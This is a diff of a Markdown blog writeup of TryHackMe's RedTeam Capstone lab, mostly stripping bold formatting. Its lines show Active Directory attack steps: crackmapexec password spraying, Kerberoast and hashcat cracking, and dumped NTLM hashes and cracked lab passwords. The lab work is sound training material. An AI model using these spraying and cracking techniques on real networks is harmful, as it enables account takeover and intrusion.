@@ -8,7 +8,7 @@ tags: [tryhackme, redteam , active directory, windows, writeups]
 TryHackMe’s RedTeam Capstone Challenge provides an unparalleled, hands-on experience that simulates real-world hacking scenarios. This challenge tests your skills in network infiltration, vulnerability exploitation, and navigating complex defenses.
 ![Untitled](/assets/N-RedTeamCC/badge.png)
 
-Peace be upon all of you, In this writeup, I won't just be sharing the direct solutions. Instead, I'll take you on a journey through my own experiences, including the failed attempts and the lessons learned. Together, we'll navigate the twists and turns of this capstone challenge, making it feel as if you're solving it yourself. Get ready to dive deep into the world of red teaming, and let's hack the bank.
+Peace be upon all of you, In this writeup, I won't just be sharing the direct solutions. Instead, I'll take you on a journey through my own experiences, including the failed attempts and the lessons learned. Together, we'll navigate the twists and turns of this capstone challenge, making it feel as if you're solving it yourself. let's hack the bank.
 
 ## **Introduction**
 
@@ -139,7 +139,7 @@ Password: 8y-oRyYwJhO8Q7xe
 MailAddr: ItsFadinG@corp.th3reserve.loc
 IP Range: 10.200.x.0/24
 =======================================
-These details are now active. As you can see, we have already purchased a domain for **domain squatting** to be used for phishing.
+These details are now active. As you can see, we have already purchased a domain for domain squatting to be used for phishing.
 Once you discover the webmail server, you can use these details to authenticate and recover additional project information from your mailbox.
 Once you have performed actions to compromise the network, please authenticate to e-Citizen in order to provide an update to the government. If your update is sufficient, you will be awarded a flag to indicate progress.
 =======================================
@@ -450,7 +450,7 @@ PORT      STATE  SERVICE       VERSION
 |   NetBIOS_Domain_Name: THERESERVE
 |   NetBIOS_Computer_Name: MAIL
 |   DNS_Domain_Name: thereserve.loc
-**|   DNS_Computer_Name: MAIL.thereserve.loc**
+|   DNS_Computer_Name: MAIL.thereserve.loc
 |   DNS_Tree_Name: thereserve.loc
 |   Product_Version: 10.0.17763
 |_  System_Time: 2024-05-20T13:37:55+00:00
@@ -687,7 +687,7 @@ Please select an option
 [5] Exit
 Selection:1
 
-**# Same Steps from 1-3 as we have got an active directory foothold**
+Same Steps from 1-3 as we have got an active directory foothold
 Please select which flag you would like to submit proof for:
 [1]     Perimeter Breach
 [2]     Active Directory Breach
@@ -1091,6 +1091,7 @@ We are now able to obtain the following flag:
 ### **Enumeration**
 
 **From WRK1 Machine**
+
 We have achieved local administrator access on the machine. However, to fully compromise the Active Directory, we need to obtain a Domain Administrator account. I have dived deep into enumeration, and I couldn’t find something interesting except this service account.
 ```powershell
 PS C:\Users\mohammad.ahmed> Get-DomainUser -Identity svcOctober
@@ -1121,7 +1122,7 @@ givenname             : svcOctober
 memberof              : CN=Internet Access,OU=Groups,DC=corp,DC=thereserve,DC=loc
 lastlogon             : 3/30/2023 10:26:54 PM
 badpwdcount           : 0
-**cn                    : svcOctober**
+cn                    : svcOctober
 useraccountcontrol    : NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 whencreated           : 2/15/2023 9:07:45 AM
 primarygroupid        : 513
@@ -1165,7 +1166,7 @@ d-r---        5/21/2024   2:13 PM                Pictures
 d-r---        5/21/2024   2:13 PM                Saved Games
 d-r---        5/21/2024   2:13 PM                Searches
 d-r---        5/21/2024   2:13 PM                Videos
--a----        5/22/2024   3:00 PM          **12915 hashes.kerberoast**
+-a----        5/22/2024   3:00 PM          12915 hashes.kerberoast
 ```
 And let’s try to crack those Kerberos tickets hashes with Hashcat. Unfortunately, only the **svcScanning** account has been cracked.
 ```bash
@@ -1177,7 +1178,7 @@ Also, another way that I have tried is doing password spraying. As we have two v
 ### **Password Spraying**
 ```bash
 $ crackmapexec smb 10.200.x.21 -u All_users.txt -p valid_passwords --continue-on-success
-**SMB         10.200.x.21   445    WRK1             [+] corp.thereserve.loc\svcScanning:Password1!** 
+SMB         10.200.x.21   445    WRK1             [+] corp.thereserve.loc\svcScanning:Password1!
 ```
 ### **BloodHound**
 After we have pawned this user, let’s gather more info about it so we can identify how we are going to use it further.
@@ -1870,10 +1871,10 @@ hashcat -m 1000 -a 0 Hashes/PaymnetsGroupsUsers.hash /usr/share/wordlists/rockyo
 fbdcd5041c96ddbd82224270b57f11fc:Password!
 ```
 Only one NTLM hash has been cracked, but luckily, three users are using the same password:
-```bash
-**a.turner**:1234:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
-**a.barker**:1309:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
-**c.young**:1277:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
+```txt
+a.turner:1234:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
+a.barker:1309:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
+c.young:1277:aad3b435b51404eeaad3b435b51404ee:fbdcd5041c96ddbd82224270b57f11fc:::
 ```
 let’s try to access the SWIFT web app with these creds only the **c.young** user worked as a Capturer user:
 ![Untitled](/assets/N-RedTeamCC/3a9feb96-870a-4110-8b2f-2e2477fa7e49.png)
